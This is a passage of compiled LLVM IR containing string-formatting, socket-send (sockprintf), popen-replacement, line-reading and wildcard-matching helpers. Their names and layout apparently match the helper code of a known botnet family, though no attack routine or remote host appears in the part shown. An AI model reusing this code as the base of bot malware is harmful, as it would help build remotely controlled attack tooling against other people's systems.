  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #3
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #3
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8* nocapture readnone, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %77 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %77

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %77, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %77, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %77, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #15
  switch i32 %27, label %60 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %77

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  call void @_exit(i32 127) #16
  unreachable

; <label>:60:                                     ; preds = %26
  %61 = load i8, i8* %1, align 1
  %62 = icmp eq i8 %61, 114
  br i1 %62, label %63, label %68

; <label>:63:                                     ; preds = %60
  %64 = load i32, i32* %10, align 4
  %65 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %66 = load i32, i32* %65, align 4
  %67 = call i32 @close(i32 %66) #3
  br label %73

; <label>:68:                                     ; preds = %60
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = load i32, i32* %10, align 4
  %72 = call i32 @close(i32 %71) #3
  br label %73

; <label>:73:                                     ; preds = %68, %63
  %.010 = phi i32 [ %64, %63 ], [ %70, %68 ]
  %74 = load i32*, i32** @fdopen_pids, align 8
  %75 = sext i32 %.010 to i64
  %76 = getelementptr inbounds i32, i32* %74, i64 %75
  store i32 %27, i32* %76, align 4
  br label %77

; <label>:77:                                     ; preds = %19, %16, %9, %5, %2, %73, %28
  %.0 = phi i32 [ %.010, %73 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #17
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
